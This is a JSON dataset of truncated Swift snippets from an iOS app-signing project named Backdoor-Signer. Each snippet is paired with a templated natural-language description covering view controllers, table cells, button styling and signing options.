    "nl": "Function imagePickerControllerDidCancel - implements imagepickercontrollerdidcancel functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController+Import-AppIcon.swift",
    "code_type": "function"
  },
  {
    "id": "3130",
    "code": "struct BundleOptions {\nvar name: String?\nvar bundleId: String?\nvar version: String?\nvar sourceURL: URL?\n}\n\n// MARK: - SigningsViewController\n\nclass SigningsViewController: UIViewController {",
    "nl": "MARK: - BundleOptions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "struct"
  },
  {
    "id": "3131",
    "code": "class SigningsViewController: UIViewController {\n// MARK: - Constants\n\nprivate enum Constants {",
    "nl": "MARK: - SigningsViewController",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "3132",
    "code": "private enum Constants {\nstatic let tableBottomInset: CGFloat = 70\nstatic let headerHeight: CGFloat = 40\nstatic let buttonHeight: CGFloat = 50\nstatic let buttonSideMargin: CGFloat = 16\nstatic let buttonBottomMargin: CGFloat = 17\nstatic let blurViewZPosition: CGFloat = 3\nstatic let buttonZPosition: CGFloat = 4\nstatic let iphoneBlurHeight: CGFloat = 80.0\nstatic let ipadBlurHeight: CGFloat = 65.0",
    "nl": "MARK: - Constants",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "3133",
    "code": "private func setupBundleOptions(from application: NSManagedObject) {\nguard let name = application.value(forKey: \"name\") as? String,\nlet bundleId = application.value(forKey: \"bundleidentifier\") as? String,\nlet version = application.value(forKey: \"version\") as? String\nelse {",
    "nl": "Function setupBundleOptions - sets upbundleoptions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3134",
    "code": "private func configureCertificateAndUUID(from application: NSManagedObject) {\nif let certificate = CoreDataManager.shared.getCurrentCertificate() {",
    "nl": "Function configureCertificateAndUUID - implements configurecertificateanduuid functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3135",
    "code": "private func handleProtectionSettings() {\nguard signingDataWrapper.signingOptions.ppqCheckProtection,\nmainOptions.mainOptions.certificate?.certData?.pPQCheck == true,\nlet bundleId = bundle?.bundleId\nelse {",
    "nl": "Function handleProtectionSettings - implements handleprotectionsettings functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3136",
    "code": "private func applyCustomConfigurations() {\n// Apply custom bundle ID if configured\nif let currentBundleId = bundle?.bundleId,\nlet newBundleId = signingDataWrapper.signingOptions.bundleIdConfig[currentBundleId]\n{",
    "nl": "Function applyCustomConfigurations - implements applycustomconfigurations functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3137",
    "code": "private func checkDynamicProtection() async {\nguard signingDataWrapper.signingOptions.ppqCheckProtection,\nmainOptions.mainOptions.certificate?.certData?.pPQCheck == true,\nlet bundleId = bundle?.bundleId\nelse {",
    "nl": "Function checkDynamicProtection - implements checkdynamicprotection functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3138",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupNavigation()\nsetupViews()\nsetupToolbar()\nsetupGestures()\n\n#if !targetEnvironment(simulator)\ncertAlert()\n#endif",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3139",
    "code": "override func viewWillAppear(_ animated: Bool) {\nsuper.viewWillAppear(animated)\ntableView.reloadData()\n}\n\ndeinit {",
    "nl": "Function viewWillAppear - implements viewwillappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3140",
    "code": "private func setupGestures() {\nlet swipeLeft = UISwipeGestureRecognizer(target: self, action: #selector(handleSwipe(_:)))\nswipeLeft.direction = .left\n\nlet swipeRight = UISwipeGestureRecognizer(target: self, action: #selector(handleSwipe(_:)))\nswipeRight.direction = .right\n\ntableView.addGestureRecognizer(swipeLeft)\ntableView.addGestureRecognizer(swipeRight)\n}",
    "nl": "MARK: - UI Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3141",
    "code": "private func setupNavigation() {\nlet logoImageView = UIImageView(image: UIImage(named: \"backdoor_glyph\"))\nlogoImageView.contentMode = .scaleAspectFit\nnavigationItem.titleView = logoImageView\nnavigationController?.navigationBar.prefersLargeTitles = false\n\nisModalInPresentation = true\nnavigationItem.leftBarButtonItem = UIBarButtonItem(\ntitle: String.localized(\"DISMISS\"),\nstyle: .done,",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3142",
    "code": "private func setupViews() {\ntableView = UITableView(frame: .zero, style: .insetGrouped)\ntableView.translatesAutoresizingMaskIntoConstraints = false\ntableView.dataSource = self\ntableView.delegate = self\ntableView.showsHorizontalScrollIndicator = false\ntableView.showsVerticalScrollIndicator = false\ntableView.contentInset.bottom = Constants.tableBottomInset\n\nview.addSubview(tableView)",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3143",
    "code": "private func setupToolbar() {\n// Configure button\nlargeButton.translatesAutoresizingMaskIntoConstraints = false\nlargeButton.addTarget(self, action: #selector(startSign), for: .touchUpInside)\n\n// Configure blur view\nlet gradientMask = VariableBlurViewConstants.defaultGradientMask\nvariableBlurView = UIVariableBlurView(frame: .zero)\nvariableBlurView?.gradientMask = gradientMask\nvariableBlurView?.transform = CGAffineTransform(rotationAngle: CGFloat.pi)",
    "nl": "Function setupToolbar - sets uptoolbar",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3144",
    "code": "private func certAlert() {\nguard mainOptions.mainOptions.certificate == nil else { return }",
    "nl": "Function certAlert - implements certalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3145",
    "code": "@objc func closeSheet() {\ndismiss(animated: true)\n}\n\n@objc func fetch() {",
    "nl": "MARK: - Actions",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3146",
    "code": "@objc func fetch() {\ntableView.reloadData()\n}\n\n@objc func handleSwipe(_ gesture: UISwipeGestureRecognizer) {",
    "nl": "Function fetch - implements fetch functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3147",
    "code": "@objc func handleSwipe(_ gesture: UISwipeGestureRecognizer) {\nlet location = gesture.location(in: tableView)\n\n// Check if swipe occurred on certificate cell\nguard let indexPath = tableView.indexPathForRow(at: location),\nindexPath.section == 1 && indexPath.row == 0\nelse {",
    "nl": "Function handleSwipe - implements handleswipe functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3148",
    "code": "@objc func startSign() {\nguard let bundle = bundle,\nlet app = application as? DownloadedApps else { return }",
    "nl": "Function startSign - implements startsign functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3149",
    "code": "private func showOfflineModeIndicator() {\n// Create offline mode badge near the top of the view\nlet offlineIndicator = UILabel()\nofflineIndicator.text = \"OFFLINE SIGNING\"\nofflineIndicator.font = UIFont.systemFont(ofSize: 12, weight: .bold)\nofflineIndicator.textColor = .white\nofflineIndicator.backgroundColor = UIColor.systemRed.withAlphaComponent(0.8)\nofflineIndicator.textAlignment = .center\nofflineIndicator.layer.cornerRadius = 10\nofflineIndicator.clipsToBounds = true",
    "nl": "/ Show a visual indicator that we're in offline mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3150",
    "code": "private func configureOfflineSigning() {\n// Get offline certificates\nlet certificates = OfflineSigningManager.shared.getOfflineSigningCertificates()\n\n// Log certificate paths\nif let certPath = certificates.cert, let keyPath = certificates.key {",
    "nl": "/ Configure signing options specifically for offline mode",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3151",
    "code": "private func showOfflineSigningError() {\nDispatchQueue.main.async {",
    "nl": "/ Show error specific to offline signing issues",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3152",
    "code": "private func handleSuccessfulSigning(signedPath: URL, signedApp: NSManagedObject) {\n// Refresh app list\nappsViewController?.fetchSources()\nappsViewController?.tableView.reloadData()\n\n// Log file path\nbackdoor.Debug.shared.log(message: signedPath.path)\n\n// Install if needed\nif signingDataWrapper.signingOptions.installAfterSigned {",
    "nl": "Function handleSuccessfulSigning - implements handlesuccessfulsigning functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3153",
    "code": "extension SigningsViewController: UITableViewDataSource, UITableViewDelegate {\nfunc numberOfSections(in _: UITableView) -> Int {",
    "nl": "MARK: - UITableViewDataSource & UITableViewDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3154",
    "code": "func numberOfSections(in _: UITableView) -> Int {\nreturn sectionTitles.count\n}\n\nfunc tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3155",
    "code": "func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nreturn tableData[section].count\n}\n\nfunc tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3156",
    "code": "func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nreturn sectionTitles[section]\n}\n\nfunc tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3157",
    "code": "func tableView(_: UITableView, heightForHeaderInSection section: Int) -> CGFloat {\nreturn sectionTitles[section].isEmpty ? 0 : Constants.headerHeight\n}\n\nfunc tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3158",
    "code": "func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {\nlet title = sectionTitles[section]\nreturn InsetGroupedSectionHeader(title: title)\n}\n\nfunc tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3159",
    "code": "func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet cellText = tableData[indexPath.section][indexPath.row]\nreturn configureCellForType(cellText, at: indexPath)\n}\n\nprivate func configureCellForType(_ cellText: String, at _: IndexPath) -> UITableViewCell {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3160",
    "code": "private func configureCellForType(_ cellText: String, at _: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .gray\ncell.textLabel?.text = cellText\n\nswitch cellText {",
    "nl": "Function configureCellForType - implements configurecellfortype functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3161",
    "code": "private func configureAppIconCell() -> UITableViewCell {\nif mainOptions.mainOptions.iconURL != nil {",
    "nl": "Function configureAppIconCell - implements configureappiconcell functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3162",
    "code": "private func configureCertificateCell(baseCell: UITableViewCell) -> UITableViewCell {\nif let certificate = mainOptions.mainOptions.certificate {",
    "nl": "Function configureCertificateCell - implements configurecertificatecell functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3163",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet itemTapped = tableData[indexPath.section][indexPath.row]\nhandleTappedItem(itemTapped, at: indexPath)\ntableView.deselectRow(at: indexPath, animated: true)\n}\n\nprivate func handleTappedItem(_ item: String, at indexPath: IndexPath) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3164",
    "code": "private func handleTappedItem(_ item: String, at indexPath: IndexPath) {\nswitch item {",
    "nl": "Function handleTappedItem - implements handletappeditem functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3165",
    "code": "private enum InputType {\ncase name, bundleId, version\n}\n\nprivate func navigateToInputViewController(for type: InputType, at indexPath: IndexPath) {",
    "nl": "enum InputType - implements functionality related to input type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "3166",
    "code": "private func navigateToInputViewController(for type: InputType, at indexPath: IndexPath) {\nvar initialValue: String\n\nswitch type {",
    "nl": "Function navigateToInputViewController - implements navigatetoinputviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3167",
    "code": "private func navigateToTweaksViewController() {\nlet viewController = SigningsTweakViewController(\nsigningDataWrapper: signingDataWrapper\n)\n\nnavigationController?.pushViewController(viewController, animated: true)\n}\n\nprivate func navigateToDylibViewController() {",
    "nl": "Function navigateToTweaksViewController - implements navigatetotweaksviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3168",
    "code": "private func navigateToDylibViewController() {\nguard let app = application as? DownloadedApps else { return }",
    "nl": "Function navigateToDylibViewController - implements navigatetodylibviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3169",
    "code": "private func navigateToAdvancedViewController() {\nlet viewController = SigningsAdvancedViewController(\nsigningDataWrapper: signingDataWrapper,\nmainOptions: mainOptions\n)\n\nnavigationController?.pushViewController(viewController, animated: true)\n}\n}\n",
    "nl": "Function navigateToAdvancedViewController - implements navigatetoadvancedviewcontroller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3170",
    "code": "extension SigningsViewController {\npublic func getFilesForDownloadedApps(app: DownloadedApps, getuuidonly: Bool) -> URL {",
    "nl": "MARK: - File Management",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "3171",
    "code": "public func getFilesForDownloadedApps(app: DownloadedApps, getuuidonly: Bool) -> URL {\ndo {",
    "nl": "Function getFilesForDownloadedApps - retrieves filesfordownloadedapps",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3172",
    "code": "private func getIconURL(for app: DownloadedApps) -> URL? {\nguard let iconURLString = app.value(forKey: \"iconURL\") as? String,\nlet iconURL = URL(string: iconURLString)\nelse {",
    "nl": "Function getIconURL - retrieves iconurl",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/SigningsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3173",
    "code": "class ActivityIndicatorViewCell: UITableViewCell {\nlet activityIndicator: UIActivityIndicatorView = {",
    "nl": "class ActivityIndicatorViewCell - implements functionality related to activity indicator view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3174",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\nactivityIndicator.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),\nactivityIndicator.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -15),\n])\n}\n}\n\nclass ActivityIndicatorButton: UIButton {",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3175",
    "code": "class ActivityIndicatorButton: UIButton {\n// MARK: - UI Components\n\nprivate let activityIndicator: UIActivityIndicatorView = {",
    "nl": "class ActivityIndicatorButton - implements functionality related to activity indicator button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3176",
    "code": "private func setupButton() {\n// Text styling\nsetTitle(String.localized(\"APP_SIGNING_VIEW_CONTROLLER_START_SIGNING\"), for: .normal)\ntitleLabel?.font = UIFont.systemFont(ofSize: 16, weight: .semibold)\nsetTitleColor(.white, for: .normal)\nframe.size = CGSize(width: 100, height: 54)\n\n// Shape styling\nlayer.cornerRadius = 14\nlayer.cornerCurve = .continuous",
    "nl": "MARK: - Setup Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3177",
    "code": "private func setupGradient() {\n// Create gradient colors from our accent color\nlet topColor = normalBackgroundColor.lighter(by: 5).cgColor\nlet bottomColor = normalBackgroundColor.darker(by: 10).cgColor\n\ngradientLayer.colors = [topColor, bottomColor]\ngradientLayer.locations = [0.0, 1.0]\ngradientLayer.startPoint = CGPoint.zero\ngradientLayer.endPoint = CGPoint(x: 0.0, y: 1.0)\ngradientLayer.cornerRadius = layer.cornerRadius",
    "nl": "Function setupGradient - sets upgradient",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3178",
    "code": "func setupPressAnimation() {\n// Add touch animations for better feedback\naddTarget(self, action: #selector(handleButtonTouchDown), for: [.touchDown, .touchDragEnter])\naddTarget(\nself,\naction: #selector(handleButtonTouchUp),\nfor: [.touchUpInside, .touchUpOutside, .touchCancel, .touchDragExit]\n)\n}\n",
    "nl": "Function setupPressAnimation - sets uppressanimation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3179",
    "code": "@objc private func handleButtonTouchDown() {\nUIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {",
    "nl": "MARK: - Action Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3180",
    "code": "@objc private func handleButtonTouchUp() {\nUIView.animate(withDuration: 0.2, delay: 0, options: [.curveEaseInOut, .allowUserInteraction], animations: {",
    "nl": "Function handleButtonTouchUp - implements handlebuttontouchup functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3181",
    "code": "func showLoadingIndicator() {\n// Add activity indicator\naddSubview(activityIndicator)\nNSLayoutConstraint.activate([\nactivityIndicator.centerXAnchor.constraint(equalTo: centerXAnchor),\nactivityIndicator.centerYAnchor.constraint(equalTo: centerYAnchor),\n])\n\n// Provide feedback before disabling\nfeedbackGenerator.impactOccurred()",
    "nl": "MARK: - Public Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3182",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\ngradientLayer.frame = bounds\ngradientLayer.cornerRadius = layer.cornerRadius\n}\n\noverride func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {",
    "nl": "MARK: - Lifecycle Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3183",
    "code": "override func traitCollectionDidChange(_ previousTraitCollection: UITraitCollection?) {\nsuper.traitCollectionDidChange(previousTraitCollection)\n\nif traitCollection.hasDifferentColorAppearance(comparedTo: previousTraitCollection) {",
    "nl": "Function traitCollectionDidChange - implements traitcollectiondidchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3184",
    "code": "extension UIColor {\nfunc lighter(by percentage: CGFloat) -> UIColor {",
    "nl": "Helper extension for color adjustments",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "extension"
  },
  {
    "id": "3185",
    "code": "func lighter(by percentage: CGFloat) -> UIColor {\nreturn adjust(by: abs(percentage))\n}\n\nfunc darker(by percentage: CGFloat) -> UIColor {",
    "nl": "Function lighter - implements lighter functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3186",
    "code": "func darker(by percentage: CGFloat) -> UIColor {\nreturn adjust(by: -abs(percentage))\n}\n\nprivate func adjust(by percentage: CGFloat) -> UIColor {",
    "nl": "Function darker - implements darker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3187",
    "code": "private func adjust(by percentage: CGFloat) -> UIColor {\nvar red: CGFloat = 0, green: CGFloat = 0, blue: CGFloat = 0, alpha: CGFloat = 0\ngetRed(&red, green: &green, blue: &blue, alpha: &alpha)\n\nlet adjustAmount = percentage / 100\n\nreturn UIColor(\nred: max(min(red + adjustAmount, 1.0), 0.0),\ngreen: max(min(green + adjustAmount, 1.0), 0.0),\nblue: max(min(blue + adjustAmount, 1.0), 0.0),",
    "nl": "Function adjust - implements adjust functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/ActivityIndicatorViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3188",
    "code": "class IconImageViewCell: UITableViewCell {\nprivate let iconImageView: UIImageView = {",
    "nl": "class IconImageViewCell - implements functionality related to icon image view cell",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/IconImageViewCell.swift",
    "code_type": "class"
  },
  {
    "id": "3189",
    "code": "private func setupImageView() {\ncontentView.addSubview(iconImageView)\n\nNSLayoutConstraint.activate([\niconImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 20),\niconImageView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 10),\niconImageView.widthAnchor.constraint(equalToConstant: 45),\niconImageView.heightAnchor.constraint(equalToConstant: 45),\niconImageView.bottomAnchor.constraint(lessThanOrEqualTo: contentView.bottomAnchor, constant: -10),\n])",
    "nl": "Function setupImageView - sets upimageview",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/IconImageViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3190",
    "code": "func configure(with image: UIImage?) {\niconImageView.image = image\n}\n}\n",
    "nl": "Function configure - implements configure functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningViewController/Components/IconImageViewCell.swift",
    "code_type": "function"
  },
  {
    "id": "3191",
    "code": "class SwitchViewCell: UITableViewCell {\nlet switchControl: UISwitch = {",
    "nl": "class SwitchViewCell - implements functionality related to switch view cell",
    "language": "swift",
    "folder": "iOS",
